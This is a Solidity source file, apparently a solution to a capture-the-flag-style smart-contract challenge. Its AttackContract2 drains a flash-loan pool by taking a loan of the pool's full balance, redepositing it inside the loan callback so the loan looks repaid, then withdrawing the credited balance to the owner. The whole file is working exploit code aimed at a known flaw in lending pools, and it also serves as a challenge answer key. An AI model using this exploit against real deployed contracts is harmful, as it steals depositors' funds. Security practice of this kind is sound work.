// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract AttackContract2 is Ownable {

    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(payable(_pool)); 
    }

    receive() external payable {}

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external payable onlyOwner {
        pool.withdraw();
        (bool sent, ) = payable(owner()).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function attack() public {
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
    }

}